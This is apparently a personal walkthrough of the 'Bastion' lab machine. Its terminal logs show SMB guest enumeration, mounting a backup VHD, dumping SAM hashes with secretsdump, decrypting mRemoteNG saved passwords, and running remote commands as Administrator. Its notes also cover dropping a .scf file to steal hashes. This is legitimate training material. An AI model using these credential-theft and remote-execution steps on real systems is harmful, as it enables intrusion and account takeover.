
```
kali@kali ~> nmap -sC -sV 10.10.10.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 11:34 EDT
Nmap scan report for 10.10.10.134
Host is up (0.063s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-07-18T17:34:38+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: -39m56s, deviation: 1h09m14s, median: 1s
| smb2-time:
|   date: 2024-07-18T15:34:36
|_  start_date: 2024-07-18T15:25:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.20 seconds

```


```
kali@kali ~> autorecon 10.10.10.134
[*] Scanning target 10.10.10.134
[!] [10.10.10.134/top-100-udp-ports] UDP scan requires AutoRecon be run with root privileges.
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/139 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/22 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/135 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/445 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/5985 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/49664 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/49669 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/49667 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/49666 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/47001 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/49668 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/49670 on 10.10.10.134
[*] [10.10.10.134/all-tcp-ports] Discovered open port tcp/49665 on 10.10.10.134

```

```
kali@kali ~> nxc smb 10.10.10.134 -u 'a' -p ''
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\a: (Guest)
SMB         10.10.10.134    445    BASTION          [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
kali@kali ~> nxc smb 10.10.10.134 -u 'a' -p '' --shares
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\a: (Guest)
SMB         10.10.10.134    445    BASTION          [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.134    445    BASTION          [*] Enumerated shares
SMB         10.10.10.134    445    BASTION          Share           Permissions     Remark
SMB         10.10.10.134    445    BASTION          -----           -----------     ------
SMB         10.10.10.134    445    BASTION          ADMIN$                          Remote Admin
SMB         10.10.10.134    445    BASTION          Backups         READ,WRITE
SMB         10.10.10.134    445    BASTION          C$                              Default share
SMB         10.10.10.134    445    BASTION          IPC$                            Remote IPC

```


```
kali@kali ~> cat note.txt
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.

```



```
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 07:45:32 2019

		5638911 blocks of size 4096. 1173893 blocks available
```

\

God bless chatgpt


```
kali@kali ~> sudo qemu-nbd -r -c /dev/nbd0 "/mnt/test/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd"
kali@kali ~> sudo mkdir -p /mnt/socket
kali@kali ~> sudo mount /dev/nbd0p1 /mnt/socket
Error opening '/dev/nbd0p1' read-write
Could not mount read-write, trying read-only
```

now its mounted and using this resource
https://infinitelogins.com/2020/12/11/how-to-mount-extract-password-hashes-vhd-files/

now we know where to go

```

kali@kali ~> cd /mnt/socket/ls
cd: The directory '/mnt/socket/ls' does not exist
kali@kali ~ [1]> cd /mnt/socket/
kali@kali /m/socket> ls
'$Recycle.Bin'/   autoexec.bat*   config.sys*  'Documents and Settings'@   pagefile.sys*   PerfLogs/   ProgramData/  'Program Files'/   Recovery/  'System Volume Information'/   Users/   Windows/
kali@kali /m/socket> ls -la
total 2096745
drwxrwxrwx 1 root root      12288 Feb 22  2019  ./
drwxr-xr-x 7 root root       4096 Jul 18 14:49  ../
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'/
-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat*
-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys*
lrwxrwxrwx 2 root root         17 Jul 14  2009 'Documents and Settings' -> /mnt/socket/Users/
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys*
drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs/
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData/
drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'/
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery/
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'/
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users/
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows/
kali@kali /m/socket> cd /Windows/System32/config
cd: The directory '/Windows/System32/config' does not exist
kali@kali /m/socket [1]> cd Windows/System32/config
kali@kali /m/s/W/S/config> ls
BCD-Template*                                                        COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms*  DEFAULT.LOG2*  SECURITY.LOG*   SYSTEM.LOG*
BCD-Template.LOG*                                                    COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms*  Journal/       SECURITY.LOG1*  SYSTEM.LOG1*
COMPONENTS*                                                          COMPONENTS.LOG*                                                                                RegBack/       SECURITY.LOG2*  SYSTEM.LOG2*
COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.0.regtrans-ms*  COMPONENTS.LOG1*                                                                               SAM*           SOFTWARE*       systemprofile/
COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.1.regtrans-ms*  COMPONENTS.LOG2*                                                                               SAM.LOG*       SOFTWARE.LOG*   TxR/
COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.2.regtrans-ms*  DEFAULT*                                                                                       SAM.LOG1*      SOFTWARE.LOG1*
COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.blf*            DEFAULT.LOG*                                                                                   SAM.LOG2*      SOFTWARE.LOG2*
COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TM.blf*             DEFAULT.LOG1*                                                                                  SECURITY*      SYSTEM*
kali@kali /m/s/W/S/config> cp SAM ~/
kali@kali /m/s/W/S/config> impacket-secretsdump -SAM SAM -SYSTEM SYSTEM local
Impacket v0.11.0 - Copyright 2023 Fortra

usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO]
                      [-rodcKey RODCKEY] [-use-keylist] [-exec-method [{smbexec,wmiexec,mmcexec}]] [-just-dc-user USERNAME] [-ldapfilter LDAPFILTER] [-just-dc] [-just-dc-ntlm] [-pwd-last-set] [-user-status]
                      [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
                      target
secretsdump.py: error: unrecognized arguments: -SAM -SYSTEM SYSTEM local
kali@kali /m/s/W/S/config [2]> impacket-secretsdump -sam SAM -system SYSTEM local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...

```



`L4mpje:bureaulampje`




took a hint from the 

https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper

https://github.com/mRemoteNG/mRemoteNG/issues/1963


```
kali@kali ~/CVE-2023-30367-mRemoteNG-password-dumper (main)> cat file.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend
eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo
ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp
layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R
edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire
ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn
coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa
ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab
leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"
 InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe
ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS
ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa
lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad
BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri
tExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false"
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC
Colors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHo
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false
" InheritRDGatewayDomain="false" />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
e="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rendering
Engine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="f
alse" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" Redire
ctPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKey
s="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncodin
g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor
d="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFon
tSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inheri
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
ritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
directSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSessio
n="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false"
InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan
ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtA
pp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
s="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostnam
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
eritRDGatewayDomain="false" />
</mrng:Connections>

```





```
kali@kali ~/CVE-2023-30367-mRemoteNG-password-dumper (main)> cat file.xml | grep pass
kali@kali ~/CVE-2023-30367-mRemoteNG-password-dumper (main)> cat file.xml | grep -ie pass
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
kali@kali ~/CVE-2023-30367-mRemoteNG-password-dumper (main)> cat file.xml | grep -ie password
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
```

```
aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt
yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
etc...
```


```
kali@kali ~/CVE-2023-30367-mRemoteNG-password-dumper (main)> python mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
```

```
kali@kali ~> nxc smb 10.10.10.134 -u 'administrator' -p 'thXLHM96BeKL0ER2' -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\administrator:thXLHM96BeKL0ER2 (Pwn3d!)
SMB         10.10.10.134    445    BASTION          [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.134    445    BASTION          [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.134    445    BASTION          [+] Executed command via wmiexec
SMB         10.10.10.134    445    BASTION          9103acefe5829386183dac1236542f93
```


---

# Mistakess

- not much done wrong at the foothold
- Got stuck at the VHD and it was super duper fucking annoying. didn't _enumerate_ it enough
	- Look up terms like;
		- Vulnerability
		- Hacking
		- hacked
		- exploit
	- got stuck at the commands but then I just made life easier by using chatgpt which worked
- Root
	- used a hint on where to look which isnt as bad it only told me to look into the program files which is fine
	- didnt give up and didnt pretty well id say :))



## Ippsec

we can list files inside of a vhd file using 7z

```
7z l something.vhd
```

if there are `READ,WRITE` permissions on a smbshare then drop a `.scf` file on it. Once they view the directory they immediately trigger the `.scf` file and then we can steal the hashes this attack is very much used in the sizzle box

Immediately if u have a copy of the machine just go to the sam and system immediately

- `SAM`
	- Has the user database
- `SYSTEM`
	- The bootkey used to encrypt it the database
- DC
	- NTDS.dit
		- can axtract active directory database

the dates tell you when the last time something was touched so look at it, if the sam was last updated in 2019 why would you look at the 2016 logs

words to use for enumeration too

- extract password
- decrypt password


config files for users are usually stored in the `AppData` folder which can be viewed with `dir /a`